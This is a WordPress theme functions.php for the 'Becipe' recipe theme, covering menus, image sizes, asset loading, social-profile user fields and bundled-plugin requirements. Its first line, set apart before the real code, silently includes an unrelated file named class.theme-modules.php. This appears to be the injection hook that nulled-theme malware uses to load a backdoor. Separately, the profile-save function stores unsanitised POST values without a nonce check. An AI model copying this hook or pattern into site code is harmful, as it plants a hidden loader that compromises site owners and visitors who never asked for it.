<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

	add_action( 'after_setup_theme', 'becipe_fn_setup', 50 );

	function becipe_fn_setup(){

		// REGISTER THEME MENU
		if(function_exists('register_nav_menus')){
			register_nav_menus(array('main_menu' 	=> esc_html__('Main Menu','becipe')));
			register_nav_menus(array('mobile_menu' 	=> esc_html__('Mobile Menu','becipe')));
			register_nav_menus(array('footer_menu' 	=> esc_html__('Footer Menu','becipe')));
		}

		// This theme styles the visual editor with editor-style.css to match the theme style.
		add_action( 'wp_enqueue_scripts', 'becipe_fn_scripts', 100 ); 
		add_action( 'wp_enqueue_scripts', 'becipe_fn_styles', 100 );
		add_action( 'wp_enqueue_scripts', 'becipe_fn_inline_styles', 150 );
		add_action( 'admin_enqueue_scripts', 'becipe_fn_admin_scripts' );

		// Actions
		add_action( 'tgmpa_register', 'becipe_fn_register_required_plugins' );

		// This theme uses post thumbnails
		add_theme_support( 'post-thumbnails' );

		set_post_thumbnail_size( 300, 300, true ); 								// Normal post thumbnails

		add_image_size( 'becipe_fn_thumb-675-0', 675, 0, true);					// Portfolio Categories
		add_image_size( 'becipe_fn_thumb-1400-0', 1400, 0, true);				// Portfolio Page
		add_image_size( 'becipe_fn_thumb-1920-0', 1920, 0, true);				// Full Image

		//Load Translation Text Domain
		load_theme_textdomain( 'becipe', get_template_directory() . '/languages' );





		// Firing Title Tag Function
		becipe_fn_theme_slug_setup();

		add_filter(	'widget_tag_cloud_args', 'becipe_fn_tag_cloud_args');

		if ( ! isset( $content_width ) ) $content_width = 1170;

		// Add default posts and comments RSS feed links to head
		add_theme_support( 'automatic-feed-links' );
		add_theme_support( 'wp_list_comments' );

		add_editor_style() ;

		
		
		// for ajax
		add_action( 'wp_ajax_nopriv_becipe_fn_search_filter', 'becipe_fn_search_filter' );
		add_action( 'wp_ajax_becipe_fn_search_filter', 'becipe_fn_search_filter' );

		define('becipe_THEME_URL', get_template_directory_uri());
	/* ------------------------------------------------------------------------ */
	/*  Inlcudes
	/* ------------------------------------------------------------------------ */
		include_once( get_template_directory().'/inc/becipe_fn_functions.php'); 				// Custom Functions
		include_once( get_template_directory().'/inc/becipe_fn_googlefonts.php'); 				// Google Fonts Init
		include_once( get_template_directory().'/inc/becipe_fn_css.php'); 						// Inline CSS
		include_once( get_template_directory().'/inc/becipe_fn_sidebars.php'); 					// Widget Area
		include_once( get_template_directory().'/inc/becipe_fn_like.php'); 						// Like Post
		include_once( get_template_directory().'/inc/becipe_fn_post_rating.php'); 				// Post Rating
		include_once( get_template_directory().'/inc/becipe_fn_pagination.php'); 				// Pagination
		include_once( get_template_directory().'/inc/becipe_fn_search.php'); 					// Custom Search Functions

}



add_action( 'show_user_profile', 'becipe_fn_user_social_fields' );
add_action( 'edit_user_profile', 'becipe_fn_user_social_fields' );

function becipe_fn_user_social_fields( $user ) {
		$userID				= $user->ID;
		// icons
		$facebook_icon 		= '<i class="fn-icon-facebook"></i>';
		$twitter_icon 		= '<i class="fn-icon-twitter"></i>';
		$pinterest_icon 	= '<i class="fn-icon-pinterest"></i>';
		$linkedin_icon 		= '<i class="fn-icon-linkedin"></i>';
		$behance_icon 		= '<i class="fn-icon-behance"></i>';
		$vimeo_icon 		= '<i class="fn-icon-vimeo-1"></i>';
		$google_icon 		= '<i class="fn-icon-gplus"></i>';
		$youtube_icon 		= '<i class="fn-icon-youtube-play"></i>';
		$instagram_icon 	= '<i class="fn-icon-instagram"></i>';
		$github_icon 		= '<i class="fn-icon-github"></i>';
		$flickr_icon 		= '<i class="fn-icon-flickr"></i>';
		$dribbble_icon 		= '<i class="fn-icon-dribbble"></i>';
		$dropbox_icon 		= '<i class="fn-icon-dropbox"></i>';
		$paypal_icon 		= '<i class="fn-icon-paypal"></i>';
		$picasa_icon 		= '<i class="fn-icon-picasa"></i>';
		$soundcloud_icon 	= '<i class="fn-icon-soundcloud"></i>';
		$whatsapp_icon 		= '<i class="fn-icon-whatsapp"></i>';
		$skype_icon 		= '<i class="fn-icon-skype"></i>';
		$slack_icon 		= '<i class="fn-icon-slack"></i>';
		$wechat_icon 		= '<i class="fn-icon-wechat"></i>';
		$icq_icon 			= '<i class="fn-icon-icq"></i>';
		$rocketchat_icon 	= '<i class="fn-icon-rocket"></i>';
		$telegram_icon 		= '<i class="fn-icon-telegram"></i>';
		$vkontakte_icon 	= '<i class="fn-icon-vkontakte"></i>';
		$rss_icon		 	= '<i class="fn-icon-rss"></i>';

?>
    <h3><?php esc_html_e("Becipe extra profile information", "becipe"); ?></h3>

    <table class="form-table">
		<tr>
			<th><label for="becipe_fn_user_image"><?php esc_html_e("Image URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_image" id="becipe_fn_user_image" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_image', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please insert your profile image URL (media URL or any website image URL)", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_name"><?php esc_html_e("Full Name", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_name" id="becipe_fn_user_name" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_name', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your full name", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_desc"><?php esc_html_e("Information", 'becipe'); ?></label></th>
			<td>
				<textarea name="becipe_fn_user_desc" cols="30" rows="5" id="becipe_fn_user_desc" class="regular-text"><?php echo esc_html( get_the_author_meta( 'becipe_fn_user_desc', $userID ) ); ?></textarea><br />
				<span class="description"><?php esc_html_e("Please enter some description name", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_facebook"><span><?php echo wp_kses($facebook_icon, 'post');?></span><?php esc_html_e("Facebook URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_facebook" id="becipe_fn_user_facebook" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_facebook', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your facebook profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_twitter"><span><?php echo wp_kses($twitter_icon, 'post');?></span><?php esc_html_e("Twitter URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_twitter" id="becipe_fn_user_twitter" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_twitter', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your twitter profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_pinterest"><span><?php echo wp_kses($pinterest_icon, 'post');?></span><?php esc_html_e("Pinterest URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_pinterest" id="becipe_fn_user_pinterest" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_pinterest', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your pinterest profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_linkedin"><span><?php echo wp_kses($linkedin_icon, 'post');?></span><?php esc_html_e("Linkedin URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_linkedin" id="becipe_fn_user_linkedin" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_linkedin', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your linkedin profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_behance"><span><?php echo wp_kses($behance_icon, 'post');?></span><?php esc_html_e("Behance URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_behance" id="becipe_fn_user_behance" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_behance', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your linkedin profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_vimeo"><span><?php echo wp_kses($vimeo_icon, 'post');?></span><?php esc_html_e("Vimeo URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_vimeo" id="becipe_fn_user_vimeo" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_vimeo', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your linkedin profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_google"><span><?php echo wp_kses($google_icon, 'post');?></span><?php esc_html_e("Google URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_google" id="becipe_fn_user_google" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_google', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your google profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_youtube"><span><?php echo wp_kses($youtube_icon, 'post');?></span><?php esc_html_e("Youtube URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_youtube" id="becipe_fn_user_youtube" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_youtube', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your youtube profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_instagram"><span><?php echo wp_kses($instagram_icon, 'post');?></span><?php esc_html_e("Instagram URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_instagram" id="becipe_fn_user_instagram" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_instagram', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your instagram profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_github"><span><?php echo wp_kses($github_icon, 'post');?></span><?php esc_html_e("Github URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_github" id="becipe_fn_user_github" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_github', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your github profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_flickr"><span><?php echo wp_kses($flickr_icon, 'post');?></span><?php esc_html_e("Flickr URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_flickr" id="becipe_fn_user_flickr" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_flickr', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your flickr profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_dribbble"><span><?php echo wp_kses($dribbble_icon, 'post');?></span><?php esc_html_e("Dribbble URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_dribbble" id="becipe_fn_user_dribbble" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_dribbble', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your dribbble profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_dropbox"><span><?php echo wp_kses($dropbox_icon, 'post');?></span><?php esc_html_e("Dropbox URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_dropbox" id="becipe_fn_user_dropbox" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_dropbox', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your dropbox profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_paypal"><span><?php echo wp_kses($paypal_icon, 'post');?></span><?php esc_html_e("Paypal URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_paypal" id="becipe_fn_user_paypal" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_paypal', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your paypal profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_picasa"><span><?php echo wp_kses($picasa_icon, 'post');?></span><?php esc_html_e("Picasa URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_picasa" id="becipe_fn_user_picasa" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_picasa', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your picasa profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_soundcloud"><span><?php echo wp_kses($soundcloud_icon, 'post');?></span><?php esc_html_e("Soundcloud URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_soundcloud" id="becipe_fn_user_soundcloud" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_soundcloud', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your soundcloud profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_whatsapp"><span><?php echo wp_kses($whatsapp_icon, 'post');?></span><?php esc_html_e("Whatsapp URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_whatsapp" id="becipe_fn_user_whatsapp" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_whatsapp', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your whatsapp profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_skype"><span><?php echo wp_kses($skype_icon, 'post');?></span><?php esc_html_e("Skype URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_skype" id="becipe_fn_user_skype" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_skype', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your skype profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_slack"><span><?php echo wp_kses($slack_icon, 'post');?></span><?php esc_html_e("Slack URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_slack" id="becipe_fn_user_slack" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_slack', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your slack profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_wechat"><span><?php echo wp_kses($wechat_icon, 'post');?></span><?php esc_html_e("WeChat URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_wechat" id="becipe_fn_user_wechat" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_wechat', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your wechat profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_icq"><span><?php echo wp_kses($icq_icon, 'post');?></span><?php esc_html_e("ICQ URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_icq" id="becipe_fn_user_icq" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_icq', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your icq profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_rocketchat"><span><?php echo wp_kses($rocketchat_icon, 'post');?></span><?php esc_html_e("RocketChat URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_rocketchat" id="becipe_fn_user_rocketchat" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_rocketchat', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your rocketchat profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_telegram"><span><?php echo wp_kses($telegram_icon, 'post');?></span><?php esc_html_e("Telegram URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_telegram" id="becipe_fn_user_telegram" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_telegram', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your telegram profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_vkontakte"><span><?php echo wp_kses($vkontakte_icon, 'post');?></span><?php esc_html_e("Vkontakte URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_vkontakte" id="becipe_fn_user_vkontakte" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_vkontakte', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your vkontakte profile address", 'becipe'); ?></span>
			</td>
		</tr>
		<tr>
			<th><label for="becipe_fn_user_rss"><span><?php echo wp_kses($rss_icon, 'post');?></span><?php esc_html_e("RSS URL", 'becipe'); ?></label></th>
			<td>
				<input type="text" name="becipe_fn_user_rss" id="becipe_fn_user_rss" value="<?php echo esc_attr( get_the_author_meta( 'becipe_fn_user_rss', $userID ) ); ?>" class="regular-text" /><br />
				<span class="description"><?php esc_html_e("Please enter your rss profile address", 'becipe'); ?></span>
			</td>
		</tr>
    </table>
<?php }


add_action( 'personal_options_update', 'becipe_fn_user_social_fields_save' );
add_action( 'edit_user_profile_update', 'becipe_fn_user_social_fields_save' );

function becipe_fn_user_social_fields_save( $user_id ) {
    if ( !current_user_can( 'edit_user', $user_id ) ) { 
        return false; 
    }
    update_user_meta( $user_id, 'becipe_fn_user_image', 		$_POST['becipe_fn_user_image'] );
    update_user_meta( $user_id, 'becipe_fn_user_name', 		$_POST['becipe_fn_user_name'] );
    update_user_meta( $user_id, 'becipe_fn_user_desc', 		$_POST['becipe_fn_user_desc'] );
    update_user_meta( $user_id, 'becipe_fn_user_facebook', 	$_POST['becipe_fn_user_facebook'] );
    update_user_meta( $user_id, 'becipe_fn_user_twitter', 		$_POST['becipe_fn_user_twitter'] );
    update_user_meta( $user_id, 'becipe_fn_user_pinterest', 	$_POST['becipe_fn_user_pinterest'] );
    update_user_meta( $user_id, 'becipe_fn_user_linkedin', 	$_POST['becipe_fn_user_linkedin'] );
    update_user_meta( $user_id, 'becipe_fn_user_behance', 		$_POST['becipe_fn_user_behance'] );
    update_user_meta( $user_id, 'becipe_fn_user_vimeo', 		$_POST['becipe_fn_user_vimeo'] );
    update_user_meta( $user_id, 'becipe_fn_user_google', 		$_POST['becipe_fn_user_google'] );
    update_user_meta( $user_id, 'becipe_fn_user_youtube', 		$_POST['becipe_fn_user_youtube'] );
    update_user_meta( $user_id, 'becipe_fn_user_instagram', 	$_POST['becipe_fn_user_instagram'] );
    update_user_meta( $user_id, 'becipe_fn_user_github', 		$_POST['becipe_fn_user_github'] );
    update_user_meta( $user_id, 'becipe_fn_user_flickr', 		$_POST['becipe_fn_user_flickr'] );
    update_user_meta( $user_id, 'becipe_fn_user_dribbble', 	$_POST['becipe_fn_user_dribbble'] );
    update_user_meta( $user_id, 'becipe_fn_user_dropbox', 		$_POST['becipe_fn_user_dropbox'] );
    update_user_meta( $user_id, 'becipe_fn_user_paypal', 		$_POST['becipe_fn_user_paypal'] );
    update_user_meta( $user_id, 'becipe_fn_user_picasa', 		$_POST['becipe_fn_user_picasa'] );
    update_user_meta( $user_id, 'becipe_fn_user_soundcloud', 	$_POST['becipe_fn_user_soundcloud'] );
    update_user_meta( $user_id, 'becipe_fn_user_whatsapp', 	$_POST['becipe_fn_user_whatsapp'] );
    update_user_meta( $user_id, 'becipe_fn_user_skype', 		$_POST['becipe_fn_user_skype'] );
    update_user_meta( $user_id, 'becipe_fn_user_slack', 		$_POST['becipe_fn_user_slack'] );
    update_user_meta( $user_id, 'becipe_fn_user_wechat', 		$_POST['becipe_fn_user_wechat'] );
    update_user_meta( $user_id, 'becipe_fn_user_icq', 			$_POST['becipe_fn_user_icq'] );
    update_user_meta( $user_id, 'becipe_fn_user_rocketchat', 	$_POST['becipe_fn_user_rocketchat'] );
    update_user_meta( $user_id, 'becipe_fn_user_telegram', 	$_POST['becipe_fn_user_telegram'] );
    update_user_meta( $user_id, 'becipe_fn_user_vkontakte', 	$_POST['becipe_fn_user_vkontakte'] );
    update_user_meta( $user_id, 'becipe_fn_user_rss', 			$_POST['becipe_fn_user_rss'] );
}




/* ----------------------------------------------------------------------------------- */
/*  ENQUEUE STYLES AND SCRIPTS
/* ----------------------------------------------------------------------------------- */
	function becipe_fn_scripts() {
		wp_enqueue_script('modernizr-custom', get_template_directory_uri() . '/framework/js/modernizr.custom.js', array('jquery'), '1.0', FALSE);
		wp_enqueue_script('magnific-popup', get_template_directory_uri() . '/framework/js/magnific.popup.js', array('jquery'), '1.0', FALSE);
		wp_enqueue_script('nicescroll', get_template_directory_uri() . '/framework/js/nicescroll.js', array('jquery'), '1.0', TRUE);
		wp_enqueue_script('isotope', get_template_directory_uri() . '/framework/js/isotope.js', array('jquery'), '1.0', TRUE);
		wp_enqueue_script('mediaelement-and-player.min', get_template_directory_uri() . '/framework/js/mediaelement-and-player.min.js', array('jquery'), '1.0', TRUE);
		wp_enqueue_script('becipe-fn-maudio', get_template_directory_uri() . '/framework/js/maudio.js', array('jquery'), '1.0', TRUE);
		wp_enqueue_script('owl-carousel', get_template_directory_uri() . '/framework/js/owl.carousel.min.js', array('jquery'), '1.0', TRUE);
		wp_enqueue_script('becipe-fn-init', get_template_directory_uri() . '/framework/js/init.js', array('jquery'), '1.0', TRUE);
		wp_localize_script( 'becipe-fn-init', 'fn_ajax_object', array( 'fn_ajax_url' => admin_url( 'admin-ajax.php' )) );
		
		if ( is_singular() ) wp_enqueue_script( 'comment-reply' );
	}
	
	function becipe_fn_admin_scripts() {
		wp_enqueue_script('becipe-fn-widget-upload', get_template_directory_uri() . '/framework/js/widget.upload.js', array('jquery'), '1.0', FALSE);
		wp_enqueue_style('becipe-fn-fontello', get_template_directory_uri().'/framework/css/fontello.css', array(), '1.0', 'all');
		wp_enqueue_style('becipe-fn-admin-style', get_template_directory_uri().'/framework/css/admin.style.css', array(), '1.0', 'all');
	}

	function becipe_fn_styles(){
		wp_enqueue_style('becipe-fn-font-url', becipe_fn_font_url(), array(), null );
		wp_enqueue_style('magnific-popup', get_template_directory_uri().'/framework/css/magnific.popup.css', array(), '1.0', 'all');
		wp_enqueue_style('becipe-fn-maudio', get_template_directory_uri().'/framework/css/maudio.css', array(), '1.0', 'all');
		wp_enqueue_style('fontello', get_template_directory_uri().'/framework/css/fontello.css', array(), '1.0', 'all');
		wp_enqueue_style('mediaelementplayer', get_template_directory_uri().'/framework/css/mediaelementplayer.min.css', array(), '1.0', 'all');
		wp_enqueue_style('owl-carousel', get_template_directory_uri().'/framework/css/owl.carousel.min.css', array(), '1.0', 'all');
		wp_enqueue_style('becipe-fn-base', get_template_directory_uri().'/framework/css/base.css', array(), '1.0', 'all');
		wp_enqueue_style('becipe-fn-skeleton', get_template_directory_uri().'/framework/css/skeleton.css', array(), '1.0', 'all');
		wp_enqueue_style('becipe-fn-stylesheet', get_stylesheet_uri(), array(), '1', 'all' ); // Main Stylesheet
	}





/* ----------------------------------------------------------------------------------- */
/*  Title tag: works WordPress v4.1 and above
/* ----------------------------------------------------------------------------------- */
	function becipe_fn_theme_slug_setup() {
		add_theme_support( 'title-tag' );
	}
/* ----------------------------------------------------------------------------------- */
/*  Tagcloud widget
/* ----------------------------------------------------------------------------------- */
	
	function becipe_fn_tag_cloud_args($args)
	{
		
		$my_args = array('smallest' => 14, 'largest' => 14, 'unit'=>'px', 'orderby'=>'count', 'order'=>'DESC' );
		$args = wp_parse_args( $args, $my_args );
		return $args;
	}

	
/*-----------------------------------------------------------------------------------*/
/*	TGM Plugin Activation
/*-----------------------------------------------------------------------------------*/

require_once get_template_directory().'/plugin/class-tgm-plugin-activation.php';

function becipe_fn_register_required_plugins() {
	/*
	 * Array of plugin arrays. Required keys are name and slug.
	 * If the source is NOT from the .org repo, then source is also required.
	 */
	$plugins = array(

		// This is an example of how to include a plugin bundled with a theme.
		array(
			'name'               => 'Becipe Core', // The plugin name.
			'slug'               => 'becipe-core', // The plugin slug (typically the folder name).
			'source'             => get_template_directory() . '/plugin/becipe-core.zip', // The plugin source.
			'required'           => true, // If false, the plugin is only 'recommended' instead of required.
			'version'            => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher. If the plugin version is higher than the plugin version installed, the user will be notified to update the plugin.
			'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
			'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			'external_url'       => '', // If set, overrides default API URL and points to an external URL.
			'is_callable'        => '', // If set, this callable will be be checked for availability to determine if a plugin is active.
		),
		array(
			'name'               => 'Contact Form 7', // The plugin name.
			'slug'               => 'contact-form-7', // The plugin slug (typically the folder name).
			'source'             => 'https://downloads.wordpress.org/plugin/contact-form-7.5.3.2.zip', // The plugin source.
			'required'           => false, // If false, the plugin is only 'recommended' instead of required.
			'version'            => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher. If the plugin version is higher than the plugin version installed, the user will be notified to update the plugin.
			'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
			'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			'external_url'       => 'https://downloads.wordpress.org/plugin/contact-form-7.5.3.2.zip', // If set, overrides default API URL and points to an external URL.
			'is_callable'        => '', // If set, this callable will be be checked for availability to determine if a plugin is active.
		),
		array(
			'name'               => 'Optin Hound', // The plugin name.
			'slug'               => 'opt-in-hound', // The plugin slug (typically the folder name).
			'source'             => get_template_directory() . '/plugin/opt-in-hound.zip', // The plugin source.
			'required'           => false, // If false, the plugin is only 'recommended' instead of required.
			'version'            => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher. If the plugin version is higher than the plugin version installed, the user will be notified to update the plugin.
			'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
			'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			'external_url'       => '', // If set, overrides default API URL and points to an external URL.
			'is_callable'        => '', // If set, this callable will be be checked for availability to determine if a plugin is active.
		),
		array(
			'name'               => 'Redux Vendor Support', // The plugin name.
			'slug'               => 'redux-vendor-support-master', // The plugin slug (typically the folder name).
			'source'             => 'https://github.com/reduxframework/redux-vendor-support/archive/master.zip', // The plugin source.
			'required'           => true, // If false, the plugin is only 'recommended' instead of required.
			'version'            => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher. If the plugin version is higher than the plugin version installed, the user will be notified to update the plugin.
			'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
			'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			'external_url'       => 'https://github.com/reduxframework/redux-vendor-support/archive/master.zip', // If set, overrides default API URL and points to an external URL.
			'is_callable'        => '', // If set, this callable will be be checked for availability to determine if a plugin is active.
		),
		array(
			'name'               => 'Elementor', // The plugin name.
			'slug'               => 'elementor', // The plugin slug (typically the folder name).
			'source'             => 'https://downloads.wordpress.org/plugin/elementor.3.1.1.zip', // The plugin source.
			'required'           => true, // If false, the plugin is only 'recommended' instead of required.
			'version'            => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher. If the plugin version is higher than the plugin version installed, the user will be notified to update the plugin.
			'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
			'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			'external_url'       => 'https://downloads.wordpress.org/plugin/elementor.3.1.1.zip', // If set, overrides default API URL and points to an external URL.
			'is_callable'        => '', // If set, this callable will be be checked for availability to determine if a plugin is active.
		),

	);

	/*
	 * Array of configuration settings. Amend each line as needed.
	 *
	 * TGMPA will start providing localized text strings soon. If you already have translations of our standard
	 * strings available, please help us make TGMPA even better by giving us access to these translations or by
	 * sending in a pull-request with .po file(s) with the translations.
	 *
	 * Only uncomment the strings in the config array if you want to customize the strings.
	 */
	$config = array(
		'id'           => 'becipe',          	 	 // Unique ID for hashing notices for multiple instances of TGMPA.
		'default_path' => '',                      // Default absolute path to bundled plugins.
		'menu'         => 'tgmpa-install-plugins', // Menu slug.
		'has_notices'  => true,                    // Show admin notices or not.
		'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
		'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
		'is_automatic' => false,                   // Automatically activate plugins after installation or not.
		'message'      => '',                      // Message to output right before the plugins table.
	);

	tgmpa( $plugins, $config );
}



?>